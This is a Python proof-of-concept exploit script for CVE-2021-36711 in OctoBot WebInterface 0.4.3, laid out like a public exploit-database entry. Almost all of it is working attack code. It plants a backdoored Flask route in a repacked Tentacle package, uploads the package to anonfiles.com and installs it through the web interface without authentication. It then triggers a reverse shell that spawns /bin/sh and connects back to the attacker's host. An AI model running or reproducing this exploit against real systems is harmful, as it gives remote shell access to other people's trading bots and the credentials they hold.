# Exploit Title: OctoBot WebInterface 0.4.3 - Remote Code Execution (RCE)
# Date: 9/2/2021
# Exploit Author: Samy Younsi, Thomas Knudsen
# Vendor Homepage: https://www.octobot.online/
# Software Link: https://github.com/Drakkar-Software/OctoBot
# Version: 0.4.0beta3 - 0.4.3
# Tested on: Linux (Ubuntu, CentOs)
# CVE : CVE-2021-36711

from __future__ import print_function, unicode_literals
from bs4 import BeautifulSoup
import argparse
import requests
import zipfile
import time
import sys
import os
import ssl
import urllib3
def banner():
  sashimiLogo = """
                              _________         .    .
                             (..       \_    ,  |\  /|
                              \       O  \  /|  \ \/ /
                               \______    \/ |   \  /
                                  vvvv\    \ |   /  |
  _         _  _     _            \^^^^  ==   \_/   |
 | |  __ _ | || |__ (_)_ __ ___ (_)`\_   ===    \.  |
/ __)/ _` / __| '_ \| | '_ ` _ \| |/ /\_   \ /      |
\__ | (_| \__ | | | | | | | | | | ||/   \_  \|      /
(   /\__,_(   |_| |_|_|_| |_| |_|_|       \________/
 |_|       |_|                       \033[1;91mOctoBot Killer\033[1;m
Author: \033[1;92mNaqwada\033[1;m
RuptureFarm 1029

                FOR EDUCATIONAL PURPOSE ONLY.
  """
  return print('\033[1;94m{}\033[1;m'.format(sashimiLogo))


def help():
  print('[!] \033[1;93mUsage: \033[1;m')
  print('[-] python3 {} --RHOST \033[1;92mTARGET_IP\033[1;m --RPORT \033[1;92mTARGET_PORT\033[1;m --LHOST \033[1;92mYOUR_IP\033[1;m --LPORT \033[1;92mYOUR_PORT\033[1;m'.format(sys.argv[0]))
  print('[-] \033[1;93mNote*\033[1;m If you are using a hostname instead of an IP address please remove http:// or https:// and try again.')


def getOctobotVersion(RHOST, RPORT):
  if RPORT == 443:
    url = 'https://{}:{}/api/version'.format(RHOST, RPORT)
  else:
    url = 'http://{}:{}/api/version'.format(RHOST, RPORT)
  return curl(url)


def restartOctobot(RHOST, RPORT):
  if RPORT == 443:
    url = 'https://{}:{}/commands/restart'.format(RHOST, RPORT)
  else:
    url = 'http://{}:{}/commands/restart'.format(RHOST, RPORT)

  try:
    requests.get(url, allow_redirects=False, verify=False, timeout=1)
  except requests.exceptions.ConnectionError as e:
    print('[+] \033[1;92mOctoBot is restarting ... Please wait 30 seconds.\033[1;m')
    time.sleep(30)


def downloadTentaclePackage(octobotVersion):
  print('[+] \033[1;92mStart downloading Tentacle package for OctoBot {}.\033[1;m'.format(octobotVersion))
  url = 'https://static.octobot.online/tentacles/officials/packages/full/base/{}/any_platform.zip'.format(octobotVersion)
  result = requests.get(url, stream=True)
  with open('{}.zip'.format(octobotVersion), 'wb') as fd:
    for chunk in result.iter_content(chunk_size=128):
        fd.write(chunk)
  print('[+] \033[1;92mDownload completed!\033[1;m')


def unzipTentaclePackage(octobotVersion):
  zip = zipfile.ZipFile('{}.zip'.format(octobotVersion))
  zip.extractall('quests')
  os.remove('{}.zip'.format(octobotVersion))
  print('[+] \033[1;92mTentacle package has been extracted.\033[1;m')


def craftBackdoor(octobotVersion):
  print('[+] \033[1;92mCrafting backdoor for Octobot Tentacle Package {}...\033[1;m'.format(octobotVersion))
  path = 'quests/reference_tentacles/Services/Interfaces/web_interface/api/'
  injectInitFile(path)
  injectMetadataFile(path)
  print('[+] \033[1;92mSashimi malicious Tentacle Package for OctoBot {} created!\033[1;m'.format(octobotVersion))


def injectMetadataFile(path):
  with open('{}metadata.py'.format(path),'r') as metadataFile:
    content = metadataFile.read()
    addPayload = content.replace('import json', ''.join('import json\nimport flask\nimport sys, socket, os, pty'))
    addPayload = addPayload.replace('@api.api.route("/announcements")', ''.join('@api.api.route("/sashimi")\ndef sashimi():\n\ts = socket.socket()\n\ts.connect((flask.request.args.get("LHOST"), int(flask.request.args.get("LPORT"))))\n\t[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]\n\tpty.spawn("/bin/sh")\n\n\n@api.api.route("/announcements")'))
  with open('{}metadata.py'.format(path),'w') as newMetadataFile:
    newMetadataFile.write(addPayload)


def injectInitFile(path):
  with open('{}__init__.py'.format(path),'r') as initFile:
    content = initFile.read()
    addPayload = content.replace('announcements,', ''.join('announcements,\n\tsashimi,'))
    addPayload = addPayload.replace('"announcements",', ''.join('"announcements",\n\t"sashimi",'))
  with open('{}__init__.py'.format(path),'w') as newInitFile:
    newInitFile.write(addPayload)


def rePackTentaclePackage():
  print('[+] \033[1;92mRepacking Tentacle package.\033[1;m')
  with zipfile.ZipFile('any_platform.zip', mode='w') as zipf:
    len_dir_path = len('quests')
    for root, _, files in os.walk('quests'):
        for file in files:
            file_path = os.path.join(root, file)
            zipf.write(file_path, file_path[len_dir_path:])


def uploadMaliciousTentacle():
  print('[+] \033[1;92mUploading Sashimi malicious Tentacle .ZIP package on anonfiles.com" link="https://app.recordedfuture.com/live/sc/entity/idn:anonfiles.com" style="">anonfiles.com... May take a minute.\033[1;m')

  file = {
      'file': open('any_platform.zip', 'rb'),
  }
  response = requests.post('https://api.anonfiles.com/upload', files=file, timeout=60)
  zipLink = response.json()['data']['file']['url']['full']
  response = requests.get(zipLink, timeout=60)
  soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
  zipLink = soup.find(id='download-url').get('href')
  print('[+] \033[1;92mSashimi malicious Tentacle has been successfully uploaded. {}\033[1;m'.format(zipLink))
  return zipLink

def curl(url):
  response = requests.get(url, allow_redirects=False, verify=False, timeout=60)
  return response


def injectBackdoor(RHOST, RPORT, zipLink):
  print('[+] \033[1;92mInjecting Sashimi malicious Tentacle packages in Ocotobot... May take a minute.\033[1;m')
  if RPORT == 443:
    url = 'https://{}:{}/advanced/tentacle_packages?update_type=add_package'.format(RHOST, RPORT)
  else:
    url = 'http://{}:{}/advanced/tentacle_packages?update_type=add_package'.format(RHOST, RPORT)

  headers = {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
  }

  data = '{"'+zipLink+'":"register_and_install"}'

  response = requests.post(url, headers=headers, data=data)
  response = response.content.decode('utf-8').replace('"', '').strip()

  os.remove('any_platform.zip')

  if response != 'Tentacles installed':
    print('[!] \033[1;91mError: Something went wrong while trying to install the malicious Tentacle package.\033[1;m')
    exit()
  print('[+] \033[1;92mSashimi malicious Tentacle package has been successfully installed on the OctoBot target.\033[1;m')


def execReverseShell(RHOST, RPORT, LHOST, LPORT):
  print('[+] \033[1;92mExecuting reverse shell on {}:{}.\033[1;m'.format(LHOST, LPORT))
  if RPORT == 443:
    url = 'https://{}:{}/api/sashimi?LHOST={}&LPORT={}'.format(RHOST, RPORT, LHOST, LPORT)
  else:
    url = 'http://{}:{}/api/sashimi?LHOST={}&LPORT={}'.format(RHOST, RPORT, LHOST, LPORT)
  return curl(url)

def isPassword(RHOST, RPORT):
  if RPORT == 443:
    url = 'https://{}:{}'.format(RHOST, RPORT)
  else:
    url = 'http://{}:{}'.format(RHOST, RPORT)
  return curl(url)

def main():
  banner()
  args = parser.parse_args()

  if isPassword(args.RHOST, args.RPORT).status_code != 200:
    print('[!] \033[1;91mError: This Octobot Platform seems to be protected with a password!\033[1;m')

  octobotVersion = getOctobotVersion(args.RHOST, args.RPORT).content.decode('utf-8').replace('"','').replace('OctoBot ','')

  if len(octobotVersion) > 0:
    print('[+] \033[1;92mPlatform OctoBot {} detected.\033[1;m'.format(octobotVersion))

  downloadTentaclePackage(octobotVersion)
  unzipTentaclePackage(octobotVersion)
  craftBackdoor(octobotVersion)
  rePackTentaclePackage()
  zipLink = uploadMaliciousTentacle()
  injectBackdoor(args.RHOST, args.RPORT, zipLink)
  restartOctobot(args.RHOST, args.RPORT)
  execReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT)


if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='POC script that exploits the Tentacles upload functionalities on OctoBot. A vulnerability has been found and can execute a reverse shell by crafting a malicious packet. Version affected from 0.4.0b3 to 0.4.0b10 so far.', add_help=False)
  parser.add_argument('-h', '--help', help=help())
  parser.add_argument('--RHOST', help="Refers to the IP of the target machine.", type=str, required=True)
  parser.add_argument('--RPORT', help="Refers to the open port of the target machine.", type=int, required=True)
  parser.add_argument('--LHOST', help="Refers to the IP of your machine.", type=str, required=True)
  parser.add_argument('--LPORT', help="Refers to the open port of your machine.", type=int, required=True)
  main()
